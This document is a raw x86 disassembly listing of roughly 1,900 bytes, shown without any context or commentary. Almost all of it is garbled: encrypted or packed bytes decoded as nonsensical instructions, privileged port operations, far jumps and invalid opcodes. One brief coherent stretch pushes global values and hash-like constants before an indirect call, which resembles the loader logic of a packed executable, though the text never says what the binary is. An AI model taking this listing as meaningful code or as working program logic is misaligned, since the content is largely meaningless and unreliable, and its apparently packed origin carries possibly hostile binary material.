  40b86f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b870:	inc    esi
  40b871:	cdq    
  40b872:	out    0xdd,eax
  40b874:	div    DWORD PTR [ecx+esi*2-0x56edd94d]
  40b87b:	stc    
  40b87c:	xchg   ecx,eax
  40b87d:	pusha  
  40b87e:	vpsubusw xmm3,xmm5,xmm1
  40b882:	ds mov bl,0x27
  40b885:	call   0x9811a244
  40b88a:	pop    ebp
  40b88b:	fsubr  st(2),st
  40b88d:	mov    bl,0x27
  40b88f:	xor    al,BYTE PTR [esi+eiz*8]
  40b892:	jl     0x40b87a
  40b894:	ficomp WORD PTR [ecx+edx*8]
  40b897:	push   ebx
  40b898:	xchg   DWORD PTR [ebp-0x10dbe8cf],ebp
  40b89e:	lahf   
  40b89f:	inc    ebp
  40b8a0:	mov    ds:0x10833c47,al
  40b8a5:	xchg   ebx,eax
  40b8a6:	mov    bh,cl
  40b8a8:	mov    ah,0x3b
  40b8aa:	or     dl,BYTE PTR [esi+0x105f6bf6]
  40b8b0:	in     eax,0xae
  40b8b2:	data16 mov ch,0x24
  40b8b5:	cmp    ecx,DWORD PTR [eax]
  40b8b7:	mul    BYTE PTR [ebx]
  40b8b9:	fcomp  st(1)
  40b8bb:	outs   dx,DWORD PTR ds:[esi]
  40b8bc:	push   0x98eb8509
  40b8c1:	pop    es
  40b8c2:	xor    eax,DWORD PTR [ecx]
  40b8c4:	push   ds
  40b8c5:	mov    edi,0x175df535
  40b8ca:	cdq    
  40b8cb:	lahf   
  40b8cc:	nop
  40b8cd:	aam    0xb0
  40b8cf:	out    0xfc,eax
  40b8d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8d2:	jecxz  0x40b8bd
  40b8d4:	jg     0x40b8c6
  40b8d6:	in     eax,dx
  40b8d7:	inc    ebx
  40b8d8:	jnp    0x40b88d
  40b8da:	ins    DWORD PTR es:[edi],dx
  40b8db:	push   edx
  40b8dc:	vmaxpd ymm5,ymm7,YMMWORD PTR [ecx-0x2061ea81]
  40b8e4:	pusha  
  40b8e5:	and    ah,BYTE PTR [eax+0x78]
  40b8e8:	je     0x40b964
  40b8ea:	jnp    0x40b877
  40b8ec:	mov    cl,0x8a
  40b8ee:	outs   dx,BYTE PTR ds:[esi]
  40b8ef:	stc    
  40b8f0:	push   0xfffffff9
  40b8f2:	outs   dx,DWORD PTR ds:[esi]
  40b8f3:	mov    ebx,0x49ecde0f
  40b8f8:	loopne 0x40b95b
  40b8fa:	inc    esp
  40b8fb:	call   0x89f5c025
  40b900:	imul   ebx,DWORD PTR [edi],0x4a26c50e
  40b906:	mov    eax,0x82f2738a
  40b90b:	pop    esp
  40b90c:	add    al,0x30
  40b90e:	outs   dx,BYTE PTR ds:[esi]
  40b90f:	stos   DWORD PTR es:[edi],eax
  40b910:	fidiv  DWORD PTR [ebx-0x52f4e529]
  40b916:	imul   esp,DWORD PTR [ebx-0x72],0x61ac89b3
  40b91d:	lods   al,BYTE PTR ds:[esi]
  40b91e:	retf   0xc1cd
  40b921:	sbb    eax,0xaf945014
  40b926:	mov    eax,ds:0x241e5f8e
  40b92b:	jae    0x40b93c
  40b92d:	fsub   st(2),st
  40b92f:	jbe    0x40b8cf
  40b931:	pop    edx
  40b932:	pusha  
  40b933:	popa   
  40b934:	out    0x7c,eax
  40b936:	aas    
  40b937:	test   DWORD PTR [edi-0x7038e412],ebx
  40b93d:	rcl    ecx,cl
  40b93f:	pavgw  mm0,QWORD PTR fs:[ebx-0xe]
  40b944:	mov    ecx,0x66d9413b
  40b949:	mov    DWORD PTR [esi+edi*2-0xc9a1085],esp
  40b950:	jae    0x40b991
  40b952:	mov    dl,0x7d
  40b954:	out    0x9b,eax
  40b956:	xor    cl,ah
  40b958:	loopne 0x40b922
  40b95a:	pop    ecx
  40b95b:	daa    
  40b95c:	fimul  WORD PTR ds:0x1ae8cf59
  40b962:	loopne 0x40b917
  40b964:	loopne 0x40b988
  40b966:	push   edx
  40b967:	mov    ecx,0x3d70c425
  40b96c:	dec    eax
  40b96d:	inc    eax
  40b96e:	dec    esi
  40b96f:	daa    
  40b970:	mov    al,BYTE PTR [esi-0x2c]
  40b973:	ficom  DWORD PTR ds:0xf211bf80
  40b979:	xchg   edi,eax
  40b97a:	and    ebx,DWORD PTR [ebx-0x45aeb5dc]
  40b980:	cmp    cl,BYTE PTR ds:0xab44b5eb
  40b986:	rcr    DWORD PTR [edx],1
  40b988:	dec    ebx
  40b989:	pop    ss
  40b98a:	cs sbb bl,al
  40b98d:	xlat   BYTE PTR ds:[ebx]
  40b98e:	clc    
  40b98f:	jno    0x40b9fe
  40b991:	sti    
  40b992:	jae    0x40b989
  40b994:	ror    BYTE PTR [ecx+0x5a4dc176],cl
  40b99a:	test   esp,eax
  40b99c:	aad    0xa4
  40b99e:	jmp    0xe5b4:0x7e7bab
  40b9a5:	(bad)  
  40b9a6:	call   0x566977ac
  40b9ab:	dec    edi
  40b9ac:	fisttp QWORD PTR [edx+ebp*2+0x1f450367]
  40b9b3:	mov    ebp,esp
  40b9b5:	dec    esp
  40b9b6:	div    DWORD PTR [eax+0x5a6f392f]
  40b9bc:	shl    DWORD PTR [edi-0x7096ed18],cl
  40b9c2:	lock jg 0x40b99c
  40b9c5:	js     0x40b9c7
  40b9c7:	add    BYTE PTR [esp+ecx*8+0x67954d76],ah
  40b9ce:	ins    DWORD PTR es:[edi],dx
  40b9cf:	fadd   QWORD PTR [ecx+0x3f5d42fb]
  40b9d5:	xlat   BYTE PTR ds:[ebx]
  40b9d6:	sub    DWORD PTR [esi+edi*2],0xbe6b834c
  40b9dd:	push   0xf48fba28
  40b9e2:	pop    edi
  40b9e3:	and    eax,edi
  40b9e5:	sbb    eax,0x5d6e0487
  40b9ea:	mov    ds,WORD PTR [ecx-0x47ab52f4]
  40b9f0:	adc    al,0xff
  40b9f2:	sbb    al,0xcb
  40b9f4:	(bad)  
  40b9f6:	ja     0x40b9f3
  40b9f8:	rcr    eax,cl
  40b9fa:	mov    al,ds:0x443108b6
  40b9ff:	(bad)
  40ba02:	adc    bl,BYTE PTR [ebx]
  40ba04:	mov    bl,0x3c
  40ba06:	jbe    0x40b99d
  40ba08:	add    al,0xfd
  40ba0a:	cmp    BYTE PTR [edi+0xb468661],al
  40ba10:	jecxz  0x40ba56
  40ba12:	dec    esp
  40ba13:	shr    BYTE PTR [edx],0x76
  40ba16:	jne    0x40b9e7
  40ba18:	lock retf 
  40ba1a:	mov    al,ds:0xb7aa621b
  40ba1f:	shl    BYTE PTR [ecx+0x2b312652],1
  40ba25:	sbb    dl,bh
  40ba27:	mov    esp,0x84ad758
  40ba2c:	and    esi,edx
  40ba2e:	inc    ecx
  40ba2f:	push   cs
  40ba30:	jae    0x40ba5a
  40ba32:	xchg   esi,eax
  40ba33:	js     0x40b9e5
  40ba35:	jmp    0x26c2:0xab480926
  40ba3c:	(bad)  
  40ba3d:	and    esp,DWORD PTR [ecx-0x46]
  40ba40:	inc    ebp
  40ba41:	lock push edi
  40ba43:	lock iret 
  40ba45:	aaa    
  40ba46:	push   gs
  40ba48:	pop    ebx
  40ba49:	xor    eax,0x26abfe4c
  40ba4e:	xchg   esi,eax
  40ba4f:	test   al,0xdd
  40ba51:	inc    esi
  40ba52:	push   ecx
  40ba53:	lahf   
  40ba54:	push   esp
  40ba55:	fwait
  40ba56:	push   edi
  40ba57:	les    ebp,FWORD PTR [eax-0x6c]
  40ba5a:	aam    0xc5
  40ba5c:	dec    edx
  40ba5d:	sbb    DWORD PTR [edx],esi
  40ba5f:	mov    bl,0xc6
  40ba61:	mov    dh,0x34
  40ba63:	iret   
  40ba64:	outs   dx,BYTE PTR ds:[esi]
  40ba65:	dec    ebx
  40ba66:	fwait
  40ba67:	scas   eax,DWORD PTR es:[edi]
  40ba68:	or     eax,0x4d8b9e39
  40ba6d:	cld    
  40ba6e:	jmp    0x40bde5
  40ba73:	psllw  mm5,QWORD PTR [edx+0xfb5b4af]
  40ba7a:	jno    0x40ba2a
  40ba7c:	pop    edx
  40ba7d:	stos   DWORD PTR es:[edi],eax
  40ba7e:	cmp    ebp,DWORD PTR [ecx+0x10050d3f]
  40ba84:	mov    eax,0xc566bbbb
  40ba89:	mov    ebx,0xf1e4aabb
  40ba8e:	or     bl,BYTE PTR [edi-0xc]
  40ba91:	out    0x71,al
  40ba93:	mov    esi,0x673bd695
  40ba98:	repnz dec esi
  40ba9a:	pusha  
  40ba9b:	sub    DWORD PTR [esi],ecx
  40ba9d:	inc    ebp
  40ba9e:	outs   dx,DWORD PTR ds:[esi]
  40ba9f:	outs   dx,DWORD PTR ds:[esi]
  40baa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baa1:	clc    
  40baa2:	fistp  WORD PTR [edi+0x69]
  40baa5:	inc    ebp
  40baa6:	mov    edi,0xc152ae4e
  40baab:	and    bh,BYTE PTR [edx-0x3691727e]
  40bab1:	jnp    0x40bb00
  40bab3:	push   ebx
  40bab4:	pop    ebx
  40bab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bab6:	sub    eax,0xac7a0453
  40babb:	test   ebp,0x69e21191
  40bac1:	int    0x7a
  40bac3:	inc    esi
  40bac4:	outs   dx,BYTE PTR ds:[esi]
  40bac5:	stos   DWORD PTR es:[edi],eax
  40bac6:	push   cs
  40bac7:	icebp  
  40bac8:	mov    ds:0x1f164dc8,eax
  40bacd:	sub    cl,BYTE PTR [esi+0x4e]
  40bad0:	sub    al,0x6c
  40bad2:	in     eax,0x6b
  40bad4:	fisub  DWORD PTR [esi+esi*1-0x7d1c4b84]
  40badb:	in     eax,dx
  40badc:	xchg   esi,eax
  40badd:	aas    
  40bade:	jmp    0xa257:0x5d1a7ce4
  40bae5:	sbb    al,0x33
  40bae7:	pusha  
  40bae8:	mov    ebp,0xb0d18017
  40baed:	stos   BYTE PTR es:[edi],al
  40baee:	cmp    ebx,esi
  40baf0:	xchg   esi,eax
  40baf1:	gs inc esp
  40baf3:	ds mov ?,eax
  40baf6:	xchg   ebp,eax
  40baf7:	push   0x2a
  40baf9:	fsub   DWORD PTR [eax+eiz*2]
  40bafc:	and    al,0x94
  40bafe:	outs   dx,DWORD PTR ds:[esi]
  40baff:	jns    0x40bb26
  40bb01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb02:	push   cs
  40bb03:	jle    0x40baef
  40bb05:	jp     0x40bb54
  40bb07:	shl    BYTE PTR [eax],1
  40bb09:	pop    ebp
  40bb0a:	fs and eax,0x13abea03
  40bb10:	and    DWORD PTR [edx],edi
  40bb12:	stc    
  40bb13:	shl    DWORD PTR [ecx],1
  40bb15:	push   edx
  40bb16:	jbe    0x40bb7c
  40bb18:	pop    ecx
  40bb19:	or     cl,BYTE PTR [ebp-0x31df657e]
  40bb1f:	retf   0x6a52
  40bb22:	push   ebp
  40bb23:	mov    DWORD PTR [edi],esp
  40bb25:	mov    bl,0xf
  40bb27:	xchg   BYTE PTR [edx-0x33bcb20b],bh
  40bb2d:	in     eax,dx
  40bb2e:	stos   DWORD PTR es:[edi],eax
  40bb2f:	int3   
  40bb30:	add    ebx,edx
  40bb32:	mov    bl,0xef
  40bb34:	pop    esi
  40bb35:	jno    0x40bbb2
  40bb37:	pop    esp
  40bb38:	dec    eax
  40bb39:	xchg   esp,eax
  40bb3a:	sti    
  40bb3b:	movq   QWORD PTR [ebp-0x3137f508],mm7
  40bb42:	push   ebx
  40bb43:	mov    DWORD PTR [ebp-0x36],ebx
  40bb46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb47:	pop    esi
  40bb48:	mov    BYTE PTR [eax],ah
  40bb4a:	mov    edi,DWORD PTR [ecx-0x2f]
  40bb4d:	push   esi
  40bb4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb4f:	or     DWORD PTR [ecx],ecx
  40bb51:	repnz arpl WORD PTR [esi+0x717a385d],di
  40bb58:	lahf   
  40bb59:	js     0x40bb70
  40bb5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb5c:	int    0xc6
  40bb5e:	pusha  
  40bb5f:	fs sbb bh,dh
  40bb62:	mov    ds:0xec7a0718,al
  40bb67:	jg     0x40bb9a
  40bb69:	test   al,0x10
  40bb6b:	(bad)  
  40bb6d:	mov    eax,ds:0x169016ca
  40bb72:	enter  0xa7d5,0x86
  40bb76:	pop    ecx
  40bb77:	xor    edi,DWORD PTR [esi+ebx*4]
  40bb7a:	scas   eax,DWORD PTR es:[edi]
  40bb7b:	or     DWORD PTR [edx],0x1b419d97
  40bb81:	test   al,0x5
  40bb83:	ss nop
  40bb85:	pop    ss
  40bb86:	das    
  40bb87:	inc    ecx
  40bb88:	gs push ss
  40bb8a:	xor    BYTE PTR [edi+edi*1+0x1a],0xc9
  40bb8f:	sbb    BYTE PTR [edx+ebx*2],cl
  40bb92:	stc    
  40bb93:	sbb    ecx,DWORD PTR [esi]
  40bb95:	imul   ecx,DWORD PTR ds:[esi],0xfffffff6
  40bb99:	add    edx,DWORD PTR [esi]
  40bb9b:	pop    esp
  40bb9c:	loop   0x40bb94
  40bb9e:	push   0xfffffffb
  40bba0:	popf   
  40bba1:	push   esp
  40bba2:	adc    DWORD PTR [eax-0x48363875],edi
  40bba8:	lods   al,BYTE PTR ds:[esi]
  40bba9:	or     BYTE PTR [esp+ebp*2],0x7a
  40bbad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbae:	loope  0x40bb58
  40bbb0:	mov    eax,0x36afae67
  40bbb5:	and    DWORD PTR [edi+0x18],ebx
  40bbb8:	fwait
  40bbb9:	jecxz  0x40bbf8
  40bbbb:	inc    ebx
  40bbbc:	push   ss
  40bbbd:	xchg   ebp,eax
  40bbbe:	xchg   edx,eax
  40bbbf:	out    0xd1,eax
  40bbc1:	sbb    al,0xe
  40bbc3:	inc    esi
  40bbc4:	sub    ebp,DWORD PTR [ecx-0x42072d4b]
  40bbca:	add    eax,0x5a4d99a2
  40bbcf:	add    esp,DWORD PTR [ebp-0x31]
  40bbd2:	or     BYTE PTR [edx-0xc],al
  40bbd5:	dec    esp
  40bbd6:	mov    bh,0x9c
  40bbd8:	jb     0x40bba1
  40bbda:	rol    DWORD PTR [ecx+ebx*8-0x5e34842c],1
  40bbe1:	es dec edi
  40bbe3:	cmp    ch,BYTE PTR [eax+ebx*2]
  40bbe6:	cld    
  40bbe7:	add    dl,BYTE PTR [ecx-0x1d76b9a0]
  40bbed:	(bad)  
  40bbee:	subps  xmm4,xmm7
  40bbf1:	and    ebp,ebp
  40bbf3:	xchg   esi,eax
  40bbf4:	clc    
  40bbf5:	cld    
  40bbf6:	jmp    0x40bbce
  40bbf8:	addr16 aad 0xaf
  40bbfb:	ins    DWORD PTR es:[edi],dx
  40bbfc:	and    ebp,esi
  40bbfe:	out    dx,al
  40bbff:	enter  0xcc78,0xf6
  40bc03:	out    0x30,eax
  40bc05:	sbb    eax,0x3a8b75be
  40bc0a:	ds mov dl,0x26
  40bc0d:	je     0x40bc5c
  40bc0f:	call   0x9afc:0xe5233a5c
  40bc16:	fisub  DWORD PTR [ebp+0x5e5c3a29]
  40bc1c:	je     0x40bc74
  40bc1e:	sub    bl,BYTE PTR [ecx+ebx*1+0x50172a0b]
  40bc25:	cmp    esp,DWORD PTR [ecx+0x2ff8215a]
  40bc2b:	mov    cl,0x26
  40bc2d:	jmp    0x82fc:0xa82206ff
  40bc34:	push   ebp
  40bc35:	xlat   BYTE PTR ds:[ebx]
  40bc36:	rol    BYTE PTR [edx-0x43],1
  40bc39:	mov    WORD PTR [esi-0x27ef18c5],ss
  40bc3f:	or     ebp,DWORD PTR [edi-0x23ce6d8f]
  40bc45:	sub    al,0xd0
  40bc47:	cmp    eax,0xd67743c5
  40bc4c:	(bad)  
  40bc4d:	or     al,0x96
  40bc4f:	(bad)  
  40bc50:	and    DWORD PTR [ecx-0x60203825],edx
  40bc56:	iret   
  40bc57:	stos   BYTE PTR es:[edi],al
  40bc58:	ins    DWORD PTR es:[edi],dx
  40bc59:	mov    esp,0x9c0a9ee9
  40bc5e:	ins    DWORD PTR es:[edi],dx
  40bc5f:	mov    BYTE PTR [edx-0x43],dl
  40bc62:	adc    al,0xd4
  40bc64:	addr16 std 
  40bc66:	push   edx
  40bc67:	jecxz  0x40bc93
  40bc69:	push   esp
  40bc6a:	or     DWORD PTR [ecx+0x1b5b5659],esp
  40bc70:	in     eax,dx
  40bc71:	in     eax,dx
  40bc72:	lods   al,BYTE PTR ds:[esi]
  40bc73:	xchg   ebx,eax
  40bc74:	cmp    BYTE PTR [ebx+0x5b],bh
  40bc77:	sbb    DWORD PTR [esi-0x73],ecx
  40bc7a:	rol    BYTE PTR [ebx],cl
  40bc7c:	outs   dx,BYTE PTR ds:[esi]
  40bc7d:	out    0xc0,eax
  40bc7f:	xchg   ecx,eax
  40bc80:	mov    bl,0x5d
  40bc82:	inc    ecx
  40bc83:	aam    0x32
  40bc85:	cmp    eax,eax
  40bc87:	stos   DWORD PTR es:[edi],eax
  40bc88:	jg     0x40bc96
  40bc8a:	add    bh,ah
  40bc8c:	jmp    0xa905:0xb7bc55de
  40bc93:	mov    bl,0x33
  40bc95:	cli    
  40bc96:	out    0x7b,eax
  40bc98:	sub    eax,0x3ac57509
  40bc9d:	lods   eax,DWORD PTR ds:[esi]
  40bc9e:	jmp    0x7af3948e
  40bca3:	test   DWORD PTR [edx+0x22b8dbd8],esi
  40bca9:	fucom  st(3)
  40bcab:	mov    esi,0xb88c28e
  40bcb0:	sub    DWORD PTR [edx],0x18
  40bcb3:	push   eax
  40bcb4:	add    dl,bl
  40bcb6:	mov    edi,0x7ecd634a
  40bcbb:	int    0x8b
  40bcbd:	int3   
  40bcbe:	xchg   edx,eax
  40bcbf:	aas    
  40bcc0:	inc    ebp
  40bcc1:	xchg   edi,eax
  40bcc2:	sub    al,0x33
  40bcc4:	arpl   WORD PTR [ebx],cx
  40bcc6:	jbe    0x40bd05
  40bcc8:	push   eax
  40bcc9:	push   ss
  40bcca:	int3   
  40bccb:	rcr    BYTE PTR [eax+0x5771e36d],0x23
  40bcd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcd3:	imul   ecx,DWORD PTR [esi+0x7d453cee],0x0
  40bcda:	pop    esi
  40bcdc:	mov    ds:0x5c978527,eax
  40bce1:	daa    
  40bce2:	shl    DWORD PTR [eax+0x1639d212],cl
  40bce8:	leave  
  40bce9:	sbb    eax,0x3a1e9ec8
  40bcee:	dec    edx
  40bcef:	rcl    BYTE PTR [esi+ebp*8-0x67],1
  40bcf3:	mov    dh,0xaf
  40bcf5:	jbe    0x40bcb4
  40bcf7:	aas    
  40bcf8:	fwait
  40bcf9:	pop    ebp
  40bcfa:	loope  0x40bceb
  40bcfc:	mov    esp,0xf43bb029
  40bd01:	scas   eax,DWORD PTR es:[edi]
  40bd02:	fistp  QWORD PTR [esi]
  40bd04:	xor    edx,eax
  40bd06:	jnp    0x40bcc9
  40bd08:	aaa    
  40bd09:	mov    cl,0xef
  40bd0b:	xor    al,0x53
  40bd0d:	sub    eax,0x830c1683
  40bd12:	dec    esi
  40bd13:	shr    BYTE PTR [ecx+0x2e],0xe1
  40bd17:	arpl   WORD PTR [ebx],dx
  40bd19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd1a:	loope  0x40bd5a
  40bd1c:	dec    esp
  40bd1d:	out    dx,eax
  40bd1e:	and    eax,0x3705f006
  40bd23:	cs mov ebp,0xff687f2f
  40bd29:	sub    al,0x6b
  40bd2b:	mov    ebx,0xe7662fa0
  40bd30:	popa   
  40bd31:	add    edx,DWORD PTR [ebx+0x2c]
  40bd34:	mov    ebp,fs
  40bd36:	push   0xffffff9d
  40bd38:	xor    ebp,DWORD PTR [esi]
  40bd3a:	cs mov ch,0xe1
  40bd3d:	sub    esp,esi
  40bd3f:	shl    esi,cl
  40bd41:	mov    eax,esi
  40bd43:	pop    ecx
  40bd44:	and    DWORD PTR [edx],ebx
  40bd46:	std    
  40bd47:	popa   
  40bd48:	push   0x76
  40bd4a:	dec    ecx
  40bd4b:	or     DWORD PTR [eax+0x15],0xead83187
  40bd52:	retf   0x79b5
  40bd55:	aam    0x4a
  40bd57:	push   eax
  40bd58:	loop   0x40bdbe
  40bd5a:	in     al,0x65
  40bd5c:	mov    BYTE PTR [edi],bl
  40bd5e:	add    al,0x1
  40bd60:	fldcw  WORD PTR ds:0x15702758
  40bd66:	sbb    BYTE PTR [ebx],dl
  40bd68:	das    
  40bd69:	adc    BYTE PTR [edi+0x33],0x84
  40bd6d:	add    al,0xb9
  40bd6f:	mov    ebp,0xd2291429
  40bd74:	push   edx
  40bd75:	mov    bh,0x10
  40bd77:	or     DWORD PTR [eax+0x50],ecx
  40bd7a:	ror    ecx,0xb4
  40bd7d:	pushf  
  40bd7e:	and    edx,0x402e7235
  40bd84:	sub    DWORD PTR [esi],ebp
  40bd86:	mov    ebp,0xaf43366a
  40bd8b:	cld    
  40bd8c:	pop    edi
  40bd8d:	ror    DWORD PTR [eax-0x48e05e14],0x51
  40bd94:	sub    al,0x41
  40bd96:	push   cs
  40bd97:	mov    ch,0xdf
  40bd99:	mov    esi,0xd1de4bc1
  40bd9e:	test   DWORD PTR [esi-0x48746c26],0x404b69fc
  40bda8:	cdq    
  40bda9:	icebp  
  40bdaa:	mov    cl,0x75
  40bdac:	rcl    DWORD PTR [esi+0x7c],0xa5
  40bdb0:	rcl    dh,cl
  40bdb2:	jnp    0x40bdce
  40bdb4:	retf   0xfece
  40bdb7:	mov    dh,0x5c
  40bdb9:	and    al,0x80
  40bdbb:	push   esp
  40bdbc:	inc    edx
  40bdbd:	sbb    eax,0x4822455
  40bdc2:	loope  0x40be15
  40bdc4:	aam    0x1d
  40bdc6:	push   esi
  40bdc7:	pop    ecx
  40bdc8:	mov    bl,0x2c
  40bdca:	add    cl,BYTE PTR [eax+edx*4-0x75]
  40bdce:	jle    0x40bd7e
  40bdd0:	mov    cs,WORD PTR [edx]
  40bdd2:	daa    
  40bdd3:	lock mov ds:0x3a645b45,al
  40bdd9:	mov    ds:0x6d63d915,eax
  40bdde:	pop    ebp
  40bddf:	xchg   ecx,eax
  40bde0:	mov    dl,0xe3
  40bde2:	dec    edx
  40bde3:	out    dx,al
  40bde4:	stos   BYTE PTR es:[edi],al
  40bde5:	mov    DWORD PTR [ecx+0x1],eax
  40bde8:	mov    eax,ds:0x422124
  40bded:	push   DWORD PTR [eax]
  40bdef:	push   DWORD PTR ds:0x422398
  40bdf5:	push   DWORD PTR ds:0x42212c
  40bdfb:	push   DWORD PTR ds:0x422378
  40be01:	push   DWORD PTR ds:0x4223ec
  40be07:	push   0xa6069caa
  40be0c:	push   0xa6069cae
  40be11:	push   DWORD PTR [ebp-0x30]
  40be14:	mov    eax,DWORD PTR [ebp-0x4]
  40be17:	call   eax
  40be19:	mov    edi,DWORD PTR [ebp+0x8]
  40be1c:	mov    eax,DWORD PTR [edi]
  40be1e:	mov    eax,DWORD PTR [ebp+0xc]
  40be21:	jmp    0x40c198
  40be26:	lea    esi,[edi+0x41]
  40be29:	mov    dh,0xb1
  40be2b:	mov    esp,0xe02c7dbd
  40be30:	pop    ss
  40be31:	inc    ebp
  40be32:	jmp    0xbd3c8d02
  40be37:	mov    edx,0xc566bbbb
  40be3c:	mov    ebx,0x162babbb
  40be41:	add    dh,ah
  40be43:	and    al,0x11
  40be45:	inc    esi
  40be46:	sbb    eax,esp
  40be48:	add    al,0xf4
  40be4a:	repz and al,0x6f
  40be4d:	mov    edi,0xdcb98dd7
  40be52:	inc    ebx
  40be53:	add    eax,0x8d800842
  40be58:	inc    esi
  40be59:	aam    0x4a
  40be5b:	rcr    cl,0x95
  40be5e:	mov    ch,cl
  40be60:	dec    eax
  40be61:	in     eax,0x40
  40be63:	out    dx,eax
  40be64:	mov    ecx,edx
  40be66:	adc    bl,BYTE PTR ds:0xc61dca71
  40be6c:	stc    
  40be6d:	cs icebp 
  40be6f:	sub    eax,0xe2d982
  40be74:	xchg   esp,eax
  40be75:	in     eax,0x4
  40be77:	call   0xcd73:0x31abf46a
  40be7e:	fwait
  40be7f:	ins    DWORD PTR es:[edi],dx
  40be80:	pushf  
  40be81:	jbe    0x40be8e
  40be83:	sub    esp,DWORD PTR [edx+0x56c888da]
  40be89:	pop    DWORD PTR [ebp-0x21]
  40be8c:	jns    0x40be5f
  40be8e:	mov    esi,ecx
  40be90:	enter  0x513e,0x44
  40be94:	xchg   edi,eax
  40be95:	jbe    0x40be7b
  40be97:	stos   BYTE PTR es:[edi],al
  40be98:	pushf  
  40be99:	aam    0x94
  40be9b:	inc    ebp
  40be9c:	js     0x40be92
  40be9e:	xchg   edx,eax
  40be9f:	fwait
  40bea0:	push   edx
  40bea1:	dec    ax
  40bea3:	aas    
  40bea4:	mov    DWORD PTR [esi+0x2a9e64f9],0x6eb5ea05
  40beae:	lea    eax,[edx-0x5b2fdcf9]
  40beb4:	mov    ds:0xe71eada6,al
  40beb9:	add    DWORD PTR [ecx-0x6d8ae703],esp
  40bebf:	inc    ebp
  40bec0:	dec    edx
  40bec1:	nop
  40bec2:	add    eax,0x86c201e8
  40bec7:	cs in  al,0x7
  40beca:	rcr    DWORD PTR es:[ebp-0x2e],1
  40bece:	mov    ah,0xa
  40bed0:	dec    ecx
  40bed1:	cmp    DWORD PTR [esi],0x11bd4393
  40bed7:	mov    esp,0x399b3d38
  40bedc:	sub    BYTE PTR [eax+0x1d],0xfb
  40bee0:	fwait
  40bee1:	and    BYTE PTR [eax+0x2],bh
  40bee4:	ficom  WORD PTR [esi]
  40bee6:	jne    0x40be7f
  40bee8:	fsubrp st(5),st
  40beea:	sahf   
  40beeb:	jmp    0x40bf0d
  40beed:	adc    al,0x95
  40beef:	adc    edi,ecx
  40bef1:	cwde   
  40bef2:	lahf   
  40bef3:	xlat   BYTE PTR ds:[ebx]
  40bef4:	and    edx,DWORD PTR [ebp-0x16]
  40bef7:	add    BYTE PTR [eax],al
  40bef9:	cmp    cl,cl
  40befb:	dec    edx
  40befc:	xchg   DWORD PTR [esp+esi*4+0x13],ebp
  40bf00:	inc    ebx
  40bf01:	in     eax,dx
  40bf02:	mov    edi,0xbc87b16e
  40bf07:	jns    0x40befb
  40bf09:	dec    esi
  40bf0a:	mov    ds:0x37397d5f,al
  40bf0f:	lock cmp BYTE PTR [esi+0x46b1eea6],0x54
  40bf17:	push   ebp
  40bf18:	mov    ch,BYTE PTR [esi+0x72]
  40bf1b:	add    BYTE PTR [edi],dl
  40bf1d:	inc    ebx
  40bf1e:	xchg   ecx,eax
  40bf1f:	push   ss
  40bf20:	pmaxub mm4,QWORD PTR [eax-0x18]
  40bf24:	sti    
  40bf25:	or     cl,dh
  40bf27:	pusha  
  40bf28:	mov    ds:0x6803ae07,eax
  40bf2d:	add    al,0x71
  40bf2f:	adc    al,0x99
  40bf31:	lahf   
  40bf32:	pop    ss
  40bf33:	fcom   DWORD PTR ds:0x938d0176
  40bf39:	xchg   ebx,eax
  40bf3a:	call   0xe9f3ec4d
  40bf3f:	adc    al,0xd9
  40bf41:	ss aam 0x35
  40bf44:	push   edx
  40bf45:	cs cmp esp,edx
  40bf48:	pop    ds
  40bf49:	mov    ch,al
  40bf4b:	or     eax,0x3d902db
  40bf50:	inc    edi
  40bf51:	add    bh,BYTE PTR [ebx+0x5145f997]
  40bf57:	std    
  40bf58:	dec    edx
  40bf59:	dec    ebx
  40bf5a:	mov    bl,0x34
  40bf5c:	sti    
  40bf5d:	pop    ds
  40bf5e:	jae    0x40bfdd
  40bf60:	push   ss
  40bf61:	pop    esp
  40bf62:	mov    bh,0x30
  40bf64:	dec    edi
  40bf65:	mov    ds:0x747d7c8b,al
  40bf6a:	pop    ecx
  40bf6b:	fcomp  DWORD PTR [ebx]
  40bf6d:	and    esp,edi
  40bf6f:	(bad)  
  40bf70:	mov    eax,0x8f6bd041
  40bf75:	ins    BYTE PTR es:[edi],dx
  40bf76:	dec    edx
  40bf77:	das    
  40bf78:	loop   0x40bf8d
  40bf7a:	call   0x36cd9a85
  40bf7f:	je     0x40bfd4
  40bf81:	add    esi,DWORD PTR [eax]
  40bf83:	test   eax,0xc0becc00
  40bf88:	mov    BYTE PTR [ebx-0x25c75031],bl
  40bf8e:	dec    ebx
  40bf8f:	shl    DWORD PTR [edi-0x27],1
  40bf92:	enter  0x5abf,0x8
  40bf96:	mov    WORD PTR [edi-0x1a56040],?
  40bf9c:	stc    
  40bf9d:	mov    eax,ds:0x7fd39ec8
  40bfa2:	jl     0x40bf79
  40bfa4:	and    DWORD PTR [ecx-0x1],eax
  40bfa7:	fdivrp st(3),st
  40bfa9:	push   0xffffffb1
  40bfab:	xchg   ebx,eax
  40bfac:	sahf   
  40bfad:	and    esi,DWORD PTR [ebp+esi*2-0x23]
  40bfb1:	cli    
  40bfb2:	les    ebp,FWORD PTR [ebx+0x100fe792]
  40bfb8:	cli    
  40bfb9:	push   ebp
  40bfba:	cwde   
  40bfbb:	add    al,0xb9
  40bfbd:	mov    eax,ds:0x228e59a4
  40bfc2:	retf   
  40bfc3:	shl    cl,0x50
  40bfc6:	test   BYTE PTR fs:[ecx+0x1826ea89],0x59
  40bfce:	cmc    
  40bfcf:	mov    edi,0x2c90c115
  40bfd4:	ins    BYTE PTR es:[edi],dx
  40bfd5:	test   DWORD PTR [edx+0xe76f44f],edx
  40bfdb:	(bad)
  40bfdf:	aaa    
  40bfe0:	sbb    DWORD PTR [ebx+0x3dfc517b],0x1a44d34c
  40bfea:	ret    
  40bfeb:	jge    0x40bf9b
  40bfed:	addr16 mov esp,0xf8adb036
